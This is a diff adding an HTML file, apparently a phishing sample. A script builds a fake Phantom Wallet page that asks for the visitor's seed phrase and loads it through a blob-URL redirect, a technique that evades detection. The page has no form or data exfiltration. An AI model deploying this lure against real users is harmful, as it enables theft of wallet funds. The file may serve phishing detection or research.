@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Redirect to Blob</title>
+  <meta http-equiv="Content-Security-Policy" content="sandbox allow-scripts">
+  <script>
+    const htmlContent = `
+      <!DOCTYPE html>
+      <html lang="en">
+      <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Phishing Page</title>
+        <style>
+          body {
+            background: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            font-family: sans-serif;
+            color: #333;
+          }
+          img {
+            width: 120px;
+            margin-bottom: 20px;
+          }
+        </style>
+      </head>
+      <body>
+        <img src="https://mintlify.s3.us-west-1.amazonaws.com/phantom-e50e2e68/resources/images/Phantom_SVG_Icon.svg" alt="Phantom Logo" />
+        <h2>Welcome to Phantom Wallet</h2>
+        <p>Please enter your seed phrase to continue.</p>
+      </body>
+      </html>
+    `;
+
+    const blob = new Blob([htmlContent], { type: 'text/html' });
+    const blobURL = URL.createObjectURL(blob);
+    location.href = blobURL;
+  </script>
+</head>
+<body></body>
+</html>
